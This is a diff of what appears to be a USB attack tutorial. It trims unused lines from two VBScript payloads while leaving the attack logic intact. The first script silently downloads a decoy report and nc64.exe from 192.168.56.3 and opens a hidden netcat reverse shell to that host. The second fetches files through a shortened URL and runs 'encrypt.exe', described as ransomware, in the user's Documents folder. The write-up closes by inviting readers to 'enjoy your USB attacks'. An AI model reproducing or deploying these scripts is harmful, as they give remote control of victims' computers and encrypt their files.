@@ -230,7 +230,6 @@ This is what I put in the revsh.vbs file:
 
 ```vbs
 Set objShell = CreateObject("Wscript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Download fake report
 downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.3/raport.txt', '%TEMP%\raport.txt')"""
@@ -247,7 +246,6 @@ objShell.Run downloadCmd, 0, True
 execCmd = "cmd /c powershell -Command ""Start-Process \""%TEMP%\nc64.exe\"" -ArgumentList '192.168.56.3', '9001', '-e', 'powershell' -WindowStyle Hidden"""
 objShell.Run execCmd, 0, True
 
-Set objFSO = Nothing
 Set objShell = Nothing
 ```
 Next thing I did was adding a shortcut to the script that I had put in a hidden folder called payload.
@@ -284,9 +282,8 @@ Just modify the .vbs file with the payload you want and enjoy your USB attacks! 
 
 
 Script that downloads the ransomware + raport.txt and executes it in the Documents folder.
-```
+```vbs
 Set objShell = CreateObject("Wscript.Shell")
-Set objFSO = CreateObject("Scripting.FileSystemObject")
 
 ' Download fake raport
 downloadRaport = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('https://tinyurl.com/3va6t8n7', '%TEMP%\BIGraport.txt')"""
@@ -304,7 +301,6 @@ objShell.Run downloadCmd, 0, True
 execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%TEMP%\encrypt.exe\"" -WorkingDirectory \""$env:UserProfile\Documents\"""""
 objShell.Run execCmd, 0, True
 
-Set objFSO = Nothing
 Set objShell = Nothing
 ```
 
